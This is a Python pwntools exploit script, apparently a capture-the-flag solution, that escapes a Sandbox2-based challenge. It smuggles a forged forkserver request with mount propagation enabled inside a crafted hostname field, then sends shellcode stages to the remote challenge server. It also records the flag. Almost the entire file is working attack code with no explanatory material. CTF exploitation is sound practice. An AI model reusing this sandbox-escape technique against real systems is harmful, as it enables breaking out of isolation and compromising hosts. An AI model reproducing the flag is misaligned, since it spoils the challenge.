from pwn import *
import os
import struct
import time
from pathlib import Path
from collections import namedtuple
import forkserver_pb2

IS_REMOTE = True
TRAILING_BYTES_AFTER_HOSTNAME_TO_CONSUME = 4
SANDBOX2_COMM_TAG_PROTO2 = b'\x02\x01\x00\x80'
INFINITE_LOOP_SHELLCODE = b'\xeb\xfe'

ShellcodePayload = namedtuple('ShellcodePayload', ['shellcode', 'hostname'])

# Generate malicious ForkRequest protobuf
# "allow_mount_propagation" will allow us to read the flag from the sandbox
def generate_malicious_fork_request_protobuf():
    server = forkserver_pb2.ForkRequest()
    server.mode = forkserver_pb2.Mode.FORKSERVER_FORK
    server.clone_flags = 2088894464     # Copied from a legit ForkRequest
    server.capabilities.extend([])
    server.allow_mount_propagation = True
    server.monitor_type = forkserver_pb2.MonitorType.FORKSERVER_MONITOR_UNSPECIFIED

    server_bytes = server.SerializeToString()
    return server_bytes


def send_exploit(p):
    # Generate malicious paylods
    malicious_fork_request_protobuf = generate_malicious_fork_request_protobuf()
    malicious_hostname = (SANDBOX2_COMM_TAG_PROTO2 + 
        struct.pack('<Q', len(malicious_fork_request_protobuf) + TRAILING_BYTES_AFTER_HOSTNAME_TO_CONSUME)
        + malicious_fork_request_protobuf)
    
    payloads = [
        ShellcodePayload(INFINITE_LOOP_SHELLCODE, "looper"),
        ShellcodePayload(Path("exploit_shellcode/shellcode.bin").read_bytes(), "exploiter"),
        ShellcodePayload(Path("print_flag_shellcode/shellcode.bin").read_bytes(), malicious_hostname)
        ]

    # Send amount of payloads
    print(p.recvuntil("Payloads to execute [0-5]: ").decode())
    p.sendline(f"{len(payloads)}")

    # Send all payloads
    for payload in payloads:
        print(p.recvuntil("Hostname: ").decode())
        p.sendline(payload.hostname)

        print(p.recvuntil("Payload size in bytes [<1MiB]: ").decode())
        p.sendline(f"{len(payload.shellcode)}")
        p.send(payload.shellcode)

    # See the flag! ("CTF{5ec2c90d71bf3e3299df32786558c14428fc}")
    # (We sometimes lose the race, so just try again if it doesn't work first try)
    p.interactive()


def main():
    if IS_REMOTE:
        p = remote('fastbox.2023.ctfcompetition.com', 1337)
    else:
        p = process("./chal")
    send_exploit(p)


if __name__ == "__main__":
    main()